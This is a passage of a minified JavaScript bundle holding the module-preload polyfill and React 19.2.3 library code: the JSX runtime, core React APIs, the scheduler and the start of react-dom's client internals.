(function() {
    const Q = document.createElement("link").relList;
    if (Q && Q.supports && Q.supports("modulepreload"))
        return;
    for (const O of document.querySelectorAll('link[rel="modulepreload"]'))
        r(O);
    new MutationObserver(O => {
        for (const H of O)
            if (H.type === "childList")
                for (const R of H.addedNodes)
                    R.tagName === "LINK" && R.rel === "modulepreload" && r(R)
    }
    ).observe(document, {
        childList: !0,
        subtree: !0
    });
    function B(O) {
        const H = {};
        return O.integrity && (H.integrity = O.integrity),
        O.referrerPolicy && (H.referrerPolicy = O.referrerPolicy),
        O.crossOrigin === "use-credentials" ? H.credentials = "include" : O.crossOrigin === "anonymous" ? H.credentials = "omit" : H.credentials = "same-origin",
        H
    }
    function r(O) {
        if (O.ep)
            return;
        O.ep = !0;
        const H = B(O);
        fetch(O.href, H)
    }
}
)();
var ff = {
    exports: {}
}
  , Eu = {};
var gr;
function eh() {
    if (gr)
        return Eu;
    gr = 1;
    var T = Symbol.for("react.transitional.element")
      , Q = Symbol.for("react.fragment");
    function B(r, O, H) {
        var R = null;
        if (H !== void 0 && (R = "" + H),
        O.key !== void 0 && (R = "" + O.key),
        "key"in O) {
            H = {};
            for (var ol in O)
                ol !== "key" && (H[ol] = O[ol])
        } else
            H = O;
        return O = H.ref,
        {
            $$typeof: T,
            type: r,
            key: R,
            ref: O !== void 0 ? O : null,
            props: H
        }
    }
    return Eu.Fragment = Q,
    Eu.jsx = B,
    Eu.jsxs = B,
    Eu
}
var Sr;
function ah() {
    return Sr || (Sr = 1,
    ff.exports = eh()),
    ff.exports
}
var f = ah()
  , sf = {
    exports: {}
}
  , Z = {};
var pr;
function uh() {
    if (pr)
        return Z;
    pr = 1;
    var T = Symbol.for("react.transitional.element")
      , Q = Symbol.for("react.portal")
      , B = Symbol.for("react.fragment")
      , r = Symbol.for("react.strict_mode")
      , O = Symbol.for("react.profiler")
      , H = Symbol.for("react.consumer")
      , R = Symbol.for("react.context")
      , ol = Symbol.for("react.forward_ref")
      , N = Symbol.for("react.suspense")
      , E = Symbol.for("react.memo")
      , X = Symbol.for("react.lazy")
      , U = Symbol.for("react.activity")
      , ul = Symbol.iterator;
    function Zl(d) {
        return d === null || typeof d != "object" ? null : (d = ul && d[ul] || d["@@iterator"],
        typeof d == "function" ? d : null)
    }
    var Yl = {
        isMounted: function() {
            return !1
        },
        enqueueForceUpdate: function() {},
        enqueueReplaceState: function() {},
        enqueueSetState: function() {}
    }
      , Nl = Object.assign
      , Tt = {};
    function Vl(d, z, M) {
        this.props = d,
        this.context = z,
        this.refs = Tt,
        this.updater = M || Yl
    }
    Vl.prototype.isReactComponent = {},
    Vl.prototype.setState = function(d, z) {
        if (typeof d != "object" && typeof d != "function" && d != null)
            throw Error("takes an object of state variables to update or a function which returns an object of state variables.");
        this.updater.enqueueSetState(this, d, z, "setState")
    }
    ,
    Vl.prototype.forceUpdate = function(d) {
        this.updater.enqueueForceUpdate(this, d, "forceUpdate")
    }
    ;
    function Ot() {}
    Ot.prototype = Vl.prototype;
    function jl(d, z, M) {
        this.props = d,
        this.context = z,
        this.refs = Tt,
        this.updater = M || Yl
    }
    var Jl = jl.prototype = new Ot;
    Jl.constructor = jl,
    Nl(Jl, Vl.prototype),
    Jl.isPureReactComponent = !0;
    var rt = Array.isArray;
    function Gl() {}
    var W = {
        H: null,
        A: null,
        T: null,
        S: null
    }
      , Xl = Object.prototype.hasOwnProperty;
    function lt(d, z, M) {
        var _ = M.ref;
        return {
            $$typeof: T,
            type: d,
            key: z,
            ref: _ !== void 0 ? _ : null,
            props: M
        }
    }
    function Dt(d, z) {
        return lt(d.type, z, d.props)
    }
    function mt(d) {
        return typeof d == "object" && d !== null && d.$$typeof === T
    }
    function Ql(d) {
        var z = {
            "=": "=0",
            ":": "=2"
        };
        return "$" + d.replace(/[=:]/g, function(M) {
            return z[M]
        })
    }
    var Ht = /\/+/g;
    function At(d, z) {
        return typeof d == "object" && d !== null && d.key != null ? Ql("" + d.key) : z.toString(36)
    }
    function tt(d) {
        switch (d.status) {
        case "fulfilled":
            return d.value;
        case "rejected":
            throw d.reason;
        default:
            switch (typeof d.status == "string" ? d.then(Gl, Gl) : (d.status = "pending",
            d.then(function(z) {
                d.status === "pending" && (d.status = "fulfilled",
                d.value = z)
            }, function(z) {
                d.status === "pending" && (d.status = "rejected",
                d.reason = z)
            })),
            d.status) {
            case "fulfilled":
                return d.value;
            case "rejected":
                throw d.reason
            }
        }
        throw d
    }
    function p(d, z, M, _, L) {
        var J = typeof d;
        (J === "undefined" || J === "boolean") && (d = null);
        var tl = !1;
        if (d === null)
            tl = !0;
        else
            switch (J) {
            case "bigint":
            case "string":
            case "number":
                tl = !0;
                break;
            case "object":
                switch (d.$$typeof) {
                case T:
                case Q:
                    tl = !0;
                    break;
                case X:
                    return tl = d._init,
                    p(tl(d._payload), z, M, _, L)
                }
            }
        if (tl)
            return L = L(d),
            tl = _ === "" ? "." + At(d, 0) : _,
            rt(L) ? (M = "",
            tl != null && (M = tl.replace(Ht, "$&/") + "/"),
            p(L, z, M, "", function(w) {
                return w
            })) : L != null && (mt(L) && (L = Dt(L, M + (L.key == null || d && d.key === L.key ? "" : ("" + L.key).replace(Ht, "$&/") + "/") + tl)),
            z.push(L)),
            1;
        tl = 0;
        var Ul = _ === "" ? "." : _ + ":";
        if (rt(d))
            for (var G = 0; G < d.length; G++)
                _ = d[G],
                J = Ul + At(_, G),
                tl += p(_, z, M, J, L);
        else if (G = Zl(d),
        typeof G == "function")
            for (d = G.call(d),
            G = 0; !(_ = d.next()).done; )
                _ = _.value,
                J = Ul + At(_, G++),
                tl += p(_, z, M, J, L);
        else if (J === "object") {
            if (typeof d.then == "function")
                return p(tt(d), z, M, _, L);
            throw z = String(d),
            Error("Objects are not valid as a React child (found: " + (z === "[object Object]" ? "object with keys {" + Object.keys(d).join(", ") + "}" : z) + "). If you meant to render a collection of children, use an array instead.")
        }
        return tl
    }
    function A(d, z, M) {
        if (d == null)
            return d;
        var _ = []
          , L = 0;
        return p(d, _, "", "", function(J) {
            return z.call(M, J, L++)
        }),
        _
    }
    function Y(d) {
        if (d._status === -1) {
            var z = d._result;
            z = z(),
            z.then(function(M) {
                (d._status === 0 || d._status === -1) && (d._status = 1,
                d._result = M)
            }, function(M) {
                (d._status === 0 || d._status === -1) && (d._status = 2,
                d._result = M)
            }),
            d._status === -1 && (d._status = 0,
            d._result = z)
        }
        if (d._status === 1)
            return d._result.default;
        throw d._result
    }
    var il = typeof reportError == "function" ? reportError : function(d) {
        if (typeof window == "object" && typeof window.ErrorEvent == "function") {
            var z = new window.ErrorEvent("error",{
                bubbles: !0,
                cancelable: !0,
                message: typeof d == "object" && d !== null && typeof d.message == "string" ? String(d.message) : String(d),
                error: d
            });
            if (!window.dispatchEvent(z))
                return
        } else if (typeof process == "object" && typeof process.emit == "function") {
            process.emit("uncaughtException", d);
            return
        }
        console.error(d)
    }
      , cl = {
        map: A,
        forEach: function(d, z, M) {
            A(d, function() {
                z.apply(this, arguments)
            }, M)
        },
        count: function(d) {
            var z = 0;
            return A(d, function() {
                z++
            }),
            z
        },
        toArray: function(d) {
            return A(d, function(z) {
                return z
            }) || []
        },
        only: function(d) {
            if (!mt(d))
                throw Error("React.Children.only expected to receive a single React element child.");
            return d
        }
    };
    return Z.Activity = U,
    Z.Children = cl,
    Z.Component = Vl,
    Z.Fragment = B,
    Z.Profiler = O,
    Z.PureComponent = jl,
    Z.StrictMode = r,
    Z.Suspense = N,
    Z.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE = W,
    Z.__COMPILER_RUNTIME = {
        __proto__: null,
        c: function(d) {
            return W.H.useMemoCache(d)
        }
    },
    Z.cache = function(d) {
        return function() {
            return d.apply(null, arguments)
        }
    }
    ,
    Z.cacheSignal = function() {
        return null
    }
    ,
    Z.cloneElement = function(d, z, M) {
        if (d == null)
            throw Error("The argument must be a React element, but you passed " + d + ".");
        var _ = Nl({}, d.props)
          , L = d.key;
        if (z != null)
            for (J in z.key !== void 0 && (L = "" + z.key),
            z)
                !Xl.call(z, J) || J === "key" || J === "__self" || J === "__source" || J === "ref" && z.ref === void 0 || (_[J] = z[J]);
        var J = arguments.length - 2;
        if (J === 1)
            _.children = M;
        else if (1 < J) {
            for (var tl = Array(J), Ul = 0; Ul < J; Ul++)
                tl[Ul] = arguments[Ul + 2];
            _.children = tl
        }
        return lt(d.type, L, _)
    }
    ,
    Z.createContext = function(d) {
        return d = {
            $$typeof: R,
            _currentValue: d,
            _currentValue2: d,
            _threadCount: 0,
            Provider: null,
            Consumer: null
        },
        d.Provider = d,
        d.Consumer = {
            $$typeof: H,
            _context: d
        },
        d
    }
    ,
    Z.createElement = function(d, z, M) {
        var _, L = {}, J = null;
        if (z != null)
            for (_ in z.key !== void 0 && (J = "" + z.key),
            z)
                Xl.call(z, _) && _ !== "key" && _ !== "__self" && _ !== "__source" && (L[_] = z[_]);
        var tl = arguments.length - 2;
        if (tl === 1)
            L.children = M;
        else if (1 < tl) {
            for (var Ul = Array(tl), G = 0; G < tl; G++)
                Ul[G] = arguments[G + 2];
            L.children = Ul
        }
        if (d && d.defaultProps)
            for (_ in tl = d.defaultProps,
            tl)
                L[_] === void 0 && (L[_] = tl[_]);
        return lt(d, J, L)
    }
    ,
    Z.createRef = function() {
        return {
            current: null
        }
    }
    ,
    Z.forwardRef = function(d) {
        return {
            $$typeof: ol,
            render: d
        }
    }
    ,
    Z.isValidElement = mt,
    Z.lazy = function(d) {
        return {
            $$typeof: X,
            _payload: {
                _status: -1,
                _result: d
            },
            _init: Y
        }
    }
    ,
    Z.memo = function(d, z) {
        return {
            $$typeof: E,
            type: d,
            compare: z === void 0 ? null : z
        }
    }
    ,
    Z.startTransition = function(d) {
        var z = W.T
          , M = {};
        W.T = M;
        try {
            var _ = d()
              , L = W.S;
            L !== null && L(M, _),
            typeof _ == "object" && _ !== null && typeof _.then == "function" && _.then(Gl, il)
        } catch (J) {
            il(J)
        } finally {
            z !== null && M.types !== null && (z.types = M.types),
            W.T = z
        }
    }
    ,
    Z.unstable_useCacheRefresh = function() {
        return W.H.useCacheRefresh()
    }
    ,
    Z.use = function(d) {
        return W.H.use(d)
    }
    ,
    Z.useActionState = function(d, z, M) {
        return W.H.useActionState(d, z, M)
    }
    ,
    Z.useCallback = function(d, z) {
        return W.H.useCallback(d, z)
    }
    ,
    Z.useContext = function(d) {
        return W.H.useContext(d)
    }
    ,
    Z.useDebugValue = function() {}
    ,
    Z.useDeferredValue = function(d, z) {
        return W.H.useDeferredValue(d, z)
    }
    ,
    Z.useEffect = function(d, z) {
        return W.H.useEffect(d, z)
    }
    ,
    Z.useEffectEvent = function(d) {
        return W.H.useEffectEvent(d)
    }
    ,
    Z.useId = function() {
        return W.H.useId()
    }
    ,
    Z.useImperativeHandle = function(d, z, M) {
        return W.H.useImperativeHandle(d, z, M)
    }
    ,
    Z.useInsertionEffect = function(d, z) {
        return W.H.useInsertionEffect(d, z)
    }
    ,
    Z.useLayoutEffect = function(d, z) {
        return W.H.useLayoutEffect(d, z)
    }
    ,
    Z.useMemo = function(d, z) {
        return W.H.useMemo(d, z)
    }
    ,
    Z.useOptimistic = function(d, z) {
        return W.H.useOptimistic(d, z)
    }
    ,
    Z.useReducer = function(d, z, M) {
        return W.H.useReducer(d, z, M)
    }
    ,
    Z.useRef = function(d) {
        return W.H.useRef(d)
    }
    ,
    Z.useState = function(d) {
        return W.H.useState(d)
    }
    ,
    Z.useSyncExternalStore = function(d, z, M) {
        return W.H.useSyncExternalStore(d, z, M)
    }
    ,
    Z.useTransition = function() {
        return W.H.useTransition()
    }
    ,
    Z.version = "19.2.3",
    Z
}
var br;
function yf() {
    return br || (br = 1,
    sf.exports = uh()),
    sf.exports
}
var ll = yf()
  , of = {
    exports: {}
}
  , Tu = {}
  , df = {
    exports: {}
}
  , rf = {};
var xr;
function nh() {
    return xr || (xr = 1,
    (function(T) {
        function Q(p, A) {
            var Y = p.length;
            p.push(A);
            l: for (; 0 < Y; ) {
                var il = Y - 1 >>> 1
                  , cl = p[il];
                if (0 < O(cl, A))
                    p[il] = A,
                    p[Y] = cl,
                    Y = il;
                else
                    break l
            }
        }
        function B(p) {
            return p.length === 0 ? null : p[0]
        }
        function r(p) {
            if (p.length === 0)
                return null;
            var A = p[0]
              , Y = p.pop();
            if (Y !== A) {
                p[0] = Y;
                l: for (var il = 0, cl = p.length, d = cl >>> 1; il < d; ) {
                    var z = 2 * (il + 1) - 1
                      , M = p[z]
                      , _ = z + 1
                      , L = p[_];
                    if (0 > O(M, Y))
                        _ < cl && 0 > O(L, M) ? (p[il] = L,
                        p[_] = Y,
                        il = _) : (p[il] = M,
                        p[z] = Y,
                        il = z);
                    else if (_ < cl && 0 > O(L, Y))
                        p[il] = L,
                        p[_] = Y,
                        il = _;
                    else
                        break l
                }
            }
            return A
        }
        function O(p, A) {
            var Y = p.sortIndex - A.sortIndex;
            return Y !== 0 ? Y : p.id - A.id
        }
        if (T.unstable_now = void 0,
        typeof performance == "object" && typeof performance.now == "function") {
            var H = performance;
            T.unstable_now = function() {
                return H.now()
            }
        } else {
            var R = Date
              , ol = R.now();
            T.unstable_now = function() {
                return R.now() - ol
            }
        }
        var N = []
          , E = []
          , X = 1
          , U = null
          , ul = 3
          , Zl = !1
          , Yl = !1
          , Nl = !1
          , Tt = !1
          , Vl = typeof setTimeout == "function" ? setTimeout : null
          , Ot = typeof clearTimeout == "function" ? clearTimeout : null
          , jl = typeof setImmediate < "u" ? setImmediate : null;
        function Jl(p) {
            for (var A = B(E); A !== null; ) {
                if (A.callback === null)
                    r(E);
                else if (A.startTime <= p)
                    r(E),
                    A.sortIndex = A.expirationTime,
                    Q(N, A);
                else
                    break;
                A = B(E)
            }
        }
        function rt(p) {
            if (Nl = !1,
            Jl(p),
            !Yl)
                if (B(N) !== null)
                    Yl = !0,
                    Gl || (Gl = !0,
                    Ql());
                else {
                    var A = B(E);
                    A !== null && tt(rt, A.startTime - p)
                }
        }
        var Gl = !1
          , W = -1
          , Xl = 5
          , lt = -1;
        function Dt() {
            return Tt ? !0 : !(T.unstable_now() - lt < Xl)
        }
        function mt() {
            if (Tt = !1,
            Gl) {
                var p = T.unstable_now();
                lt = p;
                var A = !0;
                try {
                    l: {
                        Yl = !1,
                        Nl && (Nl = !1,
                        Ot(W),
                        W = -1),
                        Zl = !0;
                        var Y = ul;
                        try {
                            t: {
                                for (Jl(p),
                                U = B(N); U !== null && !(U.expirationTime > p && Dt()); ) {
                                    var il = U.callback;
                                    if (typeof il == "function") {
                                        U.callback = null,
                                        ul = U.priorityLevel;
                                        var cl = il(U.expirationTime <= p);
                                        if (p = T.unstable_now(),
                                        typeof cl == "function") {
                                            U.callback = cl,
                                            Jl(p),
                                            A = !0;
                                            break t
                                        }
                                        U === B(N) && r(N),
                                        Jl(p)
                                    } else
                                        r(N);
                                    U = B(N)
                                }
                                if (U !== null)
                                    A = !0;
                                else {
                                    var d = B(E);
                                    d !== null && tt(rt, d.startTime - p),
                                    A = !1
                                }
                            }
                            break l
                        } finally {
                            U = null,
                            ul = Y,
                            Zl = !1
                        }
                        A = void 0
                    }
                } finally {
                    A ? Ql() : Gl = !1
                }
            }
        }
        var Ql;
        if (typeof jl == "function")
            Ql = function() {
                jl(mt)
            }
            ;
        else if (typeof MessageChannel < "u") {
            var Ht = new MessageChannel
              , At = Ht.port2;
            Ht.port1.onmessage = mt,
            Ql = function() {
                At.postMessage(null)
            }
        } else
            Ql = function() {
                Vl(mt, 0)
            }
            ;
        function tt(p, A) {
            W = Vl(function() {
                p(T.unstable_now())
            }, A)
        }
        T.unstable_IdlePriority = 5,
        T.unstable_ImmediatePriority = 1,
        T.unstable_LowPriority = 4,
        T.unstable_NormalPriority = 3,
        T.unstable_Profiling = null,
        T.unstable_UserBlockingPriority = 2,
        T.unstable_cancelCallback = function(p) {
            p.callback = null
        }
        ,
        T.unstable_forceFrameRate = function(p) {
            0 > p || 125 < p ? console.error("forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported") : Xl = 0 < p ? Math.floor(1e3 / p) : 5
        }
        ,
        T.unstable_getCurrentPriorityLevel = function() {
            return ul
        }
        ,
        T.unstable_next = function(p) {
            switch (ul) {
            case 1:
            case 2:
            case 3:
                var A = 3;
                break;
            default:
                A = ul
            }
            var Y = ul;
            ul = A;
            try {
                return p()
            } finally {
                ul = Y
            }
        }
        ,
        T.unstable_requestPaint = function() {
            Tt = !0
        }
        ,
        T.unstable_runWithPriority = function(p, A) {
            switch (p) {
            case 1:
            case 2:
            case 3:
            case 4:
            case 5:
                break;
            default:
                p = 3
            }
            var Y = ul;
            ul = p;
            try {
                return A()
            } finally {
                ul = Y
            }
        }
        ,
        T.unstable_scheduleCallback = function(p, A, Y) {
            var il = T.unstable_now();
            switch (typeof Y == "object" && Y !== null ? (Y = Y.delay,
            Y = typeof Y == "number" && 0 < Y ? il + Y : il) : Y = il,
            p) {
            case 1:
                var cl = -1;
                break;
            case 2:
                cl = 250;
                break;
            case 5:
                cl = 1073741823;
                break;
            case 4:
                cl = 1e4;
                break;
            default:
                cl = 5e3
            }
            return cl = Y + cl,
            p = {
                id: X++,
                callback: A,
                priorityLevel: p,
                startTime: Y,
                expirationTime: cl,
                sortIndex: -1
            },
            Y > il ? (p.sortIndex = Y,
            Q(E, p),
            B(N) === null && p === B(E) && (Nl ? (Ot(W),
            W = -1) : Nl = !0,
            tt(rt, Y - il))) : (p.sortIndex = cl,
            Q(N, p),
            Yl || Zl || (Yl = !0,
            Gl || (Gl = !0,
            Ql()))),
            p
        }
        ,
        T.unstable_shouldYield = Dt,
        T.unstable_wrapCallback = function(p) {
            var A = ul;
            return function() {
                var Y = ul;
                ul = A;
                try {
                    return p.apply(this, arguments)
                } finally {
                    ul = Y
                }
            }
        }
    }
    )(rf)),
    rf
}
var zr;
function ih() {
    return zr || (zr = 1,
    df.exports = nh()),
    df.exports
}
var mf = {
    exports: {}
}
  , Ll = {};
var Er;
function ch() {
    if (Er)
        return Ll;
    Er = 1;
    var T = yf();
    function Q(N) {
        var E = "https://react.dev/errors/" + N;
        if (1 < arguments.length) {
            E += "?args[]=" + encodeURIComponent(arguments[1]);
            for (var X = 2; X < arguments.length; X++)
                E += "&args[]=" + encodeURIComponent(arguments[X])
        }
        return "Minified React error #" + N + "; visit " + E + " for the full message or use the non-minified dev environment for full errors and additional helpful warnings."
    }
    function B() {}
    var r = {
        d: {
            f: B,
            r: function() {
                throw Error(Q(522))
            },
            D: B,
            C: B,
            L: B,
            m: B,
            X: B,
            S: B,
            M: B
        },
        p: 0,
        findDOMNode: null
    }
      , O = Symbol.for("react.portal");
    function H(N, E, X) {
        var U = 3 < arguments.length && arguments[3] !== void 0 ? arguments[3] : null;
        return {
            $$typeof: O,
            key: U == null ? null : "" + U,
            children: N,
            containerInfo: E,
            implementation: X
        }
    }
    var R = T.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE;
    function ol(N, E) {
        if (N === "font")
            return "";
        if (typeof E == "string")
            return E === "use-credentials" ? E : ""
    }
    return Ll.__DOM_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE = r,
    Ll.createPortal = function(N, E) {
        var X = 2 < arguments.length && arguments[2] !== void 0 ? arguments[2] : null;
        if (!E || E.nodeType !== 1 && E.nodeType !== 9 && E.nodeType !== 11)
            throw Error(Q(299));
        return H(N, E, null, X)
    }
    ,
    Ll.flushSync = function(N) {
        var E = R.T
          , X = r.p;
        try {
            if (R.T = null,
            r.p = 2,
            N)
                return N()
        } finally {
            R.T = E,
            r.p = X,
            r.d.f()
        }
    }
    ,
    Ll.preconnect = function(N, E) {
        typeof N == "string" && (E ? (E = E.crossOrigin,
        E = typeof E == "string" ? E === "use-credentials" ? E : "" : void 0) : E = null,
        r.d.C(N, E))
    }
    ,
    Ll.prefetchDNS = function(N) {
        typeof N == "string" && r.d.D(N)
    }
    ,
    Ll.preinit = function(N, E) {
        if (typeof N == "string" && E && typeof E.as == "string") {
            var X = E.as
              , U = ol(X, E.crossOrigin)
              , ul = typeof E.integrity == "string" ? E.integrity : void 0
              , Zl = typeof E.fetchPriority == "string" ? E.fetchPriority : void 0;
            X === "style" ? r.d.S(N, typeof E.precedence == "string" ? E.precedence : void 0, {
                crossOrigin: U,
                integrity: ul,
                fetchPriority: Zl
            }) : X === "script" && r.d.X(N, {
                crossOrigin: U,
                integrity: ul,
                fetchPriority: Zl,
                nonce: typeof E.nonce == "string" ? E.nonce : void 0
            })
        }
    }
    ,
    Ll.preinitModule = function(N, E) {
        if (typeof N == "string")
            if (typeof E == "object" && E !== null) {
                if (E.as == null || E.as === "script") {
                    var X = ol(E.as, E.crossOrigin);
                    r.d.M(N, {
                        crossOrigin: X,
                        integrity: typeof E.integrity == "string" ? E.integrity : void 0,
                        nonce: typeof E.nonce == "string" ? E.nonce : void 0
                    })
                }
            } else
                E == null && r.d.M(N)
    }
    ,
    Ll.preload = function(N, E) {
        if (typeof N == "string" && typeof E == "object" && E !== null && typeof E.as == "string") {
            var X = E.as
              , U = ol(X, E.crossOrigin);
            r.d.L(N, X, {
                crossOrigin: U,
                integrity: typeof E.integrity == "string" ? E.integrity : void 0,
                nonce: typeof E.nonce == "string" ? E.nonce : void 0,
                type: typeof E.type == "string" ? E.type : void 0,
                fetchPriority: typeof E.fetchPriority == "string" ? E.fetchPriority : void 0,
                referrerPolicy: typeof E.referrerPolicy == "string" ? E.referrerPolicy : void 0,
                imageSrcSet: typeof E.imageSrcSet == "string" ? E.imageSrcSet : void 0,
                imageSizes: typeof E.imageSizes == "string" ? E.imageSizes : void 0,
                media: typeof E.media == "string" ? E.media : void 0
            })
        }
    }
    ,
    Ll.preloadModule = function(N, E) {
        if (typeof N == "string")
            if (E) {
                var X = ol(E.as, E.crossOrigin);
                r.d.m(N, {
                    as: typeof E.as == "string" && E.as !== "script" ? E.as : void 0,
                    crossOrigin: X,
                    integrity: typeof E.integrity == "string" ? E.integrity : void 0
                })
            } else
                r.d.m(N)
    }
    ,
    Ll.requestFormReset = function(N) {
        r.d.r(N)
    }
    ,
    Ll.unstable_batchedUpdates = function(N, E) {
        return N(E)
    }
    ,
    Ll.useFormState = function(N, E, X) {
        return R.H.useFormState(N, E, X)
    }
    ,
    Ll.useFormStatus = function() {
        return R.H.useHostTransitionStatus()
    }
    ,
    Ll.version = "19.2.3",
    Ll
}
var Tr;
function fh() {
    if (Tr)
        return mf.exports;
    Tr = 1;
    function T() {
        if (!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ > "u" || typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE != "function"))
            try {
                __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(T)
            } catch (Q) {
                console.error(Q)
            }
    }
    return T(),
    mf.exports = ch(),
    mf.exports
}
var Ar;
function sh() {
    if (Ar)
        return Tu;
    Ar = 1;
    var T = ih()
      , Q = yf()
      , B = fh();
    function r(l) {
        var t = "https://react.dev/errors/" + l;
        if (1 < arguments.length) {
            t += "?args[]=" + encodeURIComponent(arguments[1]);
            for (var e = 2; e < arguments.length; e++)
                t += "&args[]=" + encodeURIComponent(arguments[e])
        }
        return "Minified React error #" + l + "; visit " + t + " for the full message or use the non-minified dev environment for full errors and additional helpful warnings."
    }
    function O(l) {
        return !(!l || l.nodeType !== 1 && l.nodeType !== 9 && l.nodeType !== 11)
    }
    function H(l) {
        var t = l
          , e = l;
        if (l.alternate)
            for (; t.return; )
                t = t.return;
        else {
            l = t;
            do
                t = l,
                (t.flags & 4098) !== 0 && (e = t.return),
                l = t.return;
            while (l)
        }
        return t.tag === 3 ? e : null
    }
    function R(l) {
        if (l.tag === 13) {
            var t = l.memoizedState;
            if (t === null && (l = l.alternate,
            l !== null && (t = l.memoizedState)),
            t !== null)
                return t.dehydrated
        }
        return null
    }
    function ol(l) {
        if (l.tag === 31) {
            var t = l.memoizedState;
            if (t === null && (l = l.alternate,
            l !== null && (t = l.memoizedState)),
            t !== null)
                return t.dehydrated
        }
        return null
    }
    function N(l) {
        if (H(l) !== l)
            throw Error(r(188))
    }
    function E(l) {
        var t = l.alternate;
        if (!t) {
            if (t = H(l),
            t === null)
                throw Error(r(188));
            return t !== l ? null : l
        }
        for (var e = l, a = t; ; ) {
            var u = e.return;
            if (u === null)
                break;
            var n = u.alternate;
            if (n === null) {
                if (a = u.return,
                a !== null) {
                    e = a;
                    continue
                }
                break
            }
            if (u.child === n.child) {
                for (n = u.child; n; ) {
                    if (n === e)
                        return N(u),
                        l;
                    if (n === a)
                        return N(u),
                        t;
                    n = n.sibling
                }
                throw Error(r(188))
            }
            if (e.return !== a.return)
                e = u,
                a = n;
            else {
                for (var i = !1, c = u.child; c; ) {
                    if (c === e) {
                        i = !0,
                        e = u,
                        a = n;
                        break
                    }
                    if (c === a) {
                        i = !0,
                        a = u,
                        e = n;
                        break
                    }
                    c = c.sibling
                }
                if (!i) {
                    for (c = n.child; c; ) {
                        if (c === e) {
                            i = !0,
                            e = n,
                            a = u;
                            break
                        }
                        if (c === a) {
                            i = !0,
                            a = n,
                            e = u;
                            break
                        }
                        c = c.sibling
                    }
                    if (!i)
                        throw Error(r(189))
                }
            }
            if (e.alternate !== a)
                throw Error(r(190))
        }
        if (e.tag !== 3)
            throw Error(r(188));
        return e.stateNode.current === e ? l : t
    }
    function X(l) {
        var t = l.tag;
        if (t === 5 || t === 26 || t === 27 || t === 6)
            return l;
        for (l = l.child; l !== null; ) {
            if (t = X(l),
            t !== null)
                return t;
            l = l.sibling
        }
        return null
    }
    var U = Object.assign
      , ul = Symbol.for("react.element")
      , Zl = Symbol.for("react.transitional.element")
      , Yl = Symbol.for("react.portal")
      , Nl = Symbol.for("react.fragment")
      , Tt = Symbol.for("react.strict_mode")
      , Vl = Symbol.for("react.profiler")
      , Ot = Symbol.for("react.consumer")
      , jl = Symbol.for("react.context")
      , Jl = Symbol.for("react.forward_ref")
      , rt = Symbol.for("react.suspense")
      , Gl = Symbol.for("react.suspense_list")
      , W = Symbol.for("react.memo")
      , Xl = Symbol.for("react.lazy")
      , lt = Symbol.for("react.activity")
      , Dt = Symbol.for("react.memo_cache_sentinel")
      , mt = Symbol.iterator;
    function Ql(l) {
        return l === null || typeof l != "object" ? null : (l = mt && l[mt] || l["@@iterator"],
        typeof l == "function" ? l : null)
    }
    var Ht = Symbol.for("react.client.reference");
    function At(l) {
        if (l == null)
            return null;
        if (typeof l == "function")
            return l.$$typeof === Ht ? null : l.displayName || l.name || null;
        if (typeof l == "string")
            return l;
        switch (l) {
        case Nl:
            return "Fragment";
        case Vl:
            return "Profiler";
        case Tt:
            return "StrictMode";
        case rt:
            return "Suspense";
        case Gl:
            return "SuspenseList";
        case lt:
            return "Activity"
        }
        if (typeof l == "object")
            switch (l.$$typeof) {
            case Yl:
                return "Portal";
            case jl:
                return l.displayName || "Context";
            case Ot:
                return (l._context.displayName || "Context") + ".Consumer";
            case Jl:
                var t = l.render;
                return l = l.displayName,
                l || (l = t.displayName || t.name || "",
                l = l !== "" ? "ForwardRef(" + l + ")" : "ForwardRef"),
                l;
            case W:
                return t = l.displayName || null,
                t !== null ? t : At(l.type) || "Memo";
            case Xl:
                t = l._payload,
                l = l._init;
                try {
                    return At(l(t))
                } catch {}
            }
        return null
    }
    var tt = Array.isArray
      , p = Q.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE
      , A = B.__DOM_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE
      , Y = {
        pending: !1,
        data: null,
        method: null,
        action: null
    }
      , il = []
      , cl = -1;
    function d(l) {
        return {
            current: l
        }
    }
    function z(l) {
        0 > cl || (l.current = il[cl],
        il[cl] = null,
        cl--)
    }
    function M(l, t) {
        cl++,
        il[cl] = l.current,
        l.current = t
    }
    var _ = d(null)
      , L = d(null)
      , J = d(null)
      , tl = d(null);
    function Ul(l, t) {
        switch (M(J, t),
        M(L, l),
        M(_, null),
        t.nodeType) {
        case 9:
        case 11:
            l = (l = t.documentElement) && (l = l.namespaceURI) ? Xd(l) : 0;
            break;
        default:
            if (l = t.tagName,
            t = t.namespaceURI)
                t = Xd(t),
                l = Qd(t, l);
            else
                switch (l) {
                case "svg":
                    l = 1;
                    break;
                case "math":
                    l = 2;
                    break;
                default:
                    l = 0
                }
        }
        z(_),
        M(_, l)
    }
    function G() {
        z(_),
        z(L),
        z(J)
    }
    function w(l) {
        l.memoizedState !== null && M(tl, l);
        var t = _.current
          , e = Qd(t, l.type);
        t !== e && (M(L, l),
        M(_, e))
    }
    function Ae(l) {
        L.current === l && (z(_),
        z(L)),
        tl.current === l && (z(tl),
        pu._currentValue = Y)
    }
    var Ke, Je;
    function Me(l) {
        if (Ke === void 0)
            try {
                throw Error()
            } catch (e) {
                var t = e.stack.trim().match(/\n( *(at )?)/);
                Ke = t && t[1] || "",
                Je = -1 < e.stack.indexOf(`
    at`) ? " (<anonymous>)" : -1 < e.stack.indexOf("@") ? "@unknown:0:0" : ""
            }
        return `
` + Ke + l + Je
    }
    var Vn = !1;
    function Kn(l, t) {
        if (!l || Vn)
            return "";
        Vn = !0;
        var e = Error.prepareStackTrace;
        Error.prepareStackTrace = void 0;
        try {
            var a = {
                DetermineComponentFrameRoot: function() {
                    try {
                        if (t) {
                            var x = function() {
                                throw Error()
                            };
                            if (Object.defineProperty(x.prototype, "props", {
                                set: function() {
                                    throw Error()
                                }
                            }),
                            typeof Reflect == "object" && Reflect.construct) {
                                try {
                                    Reflect.construct(x, [])
                                } catch (g) {
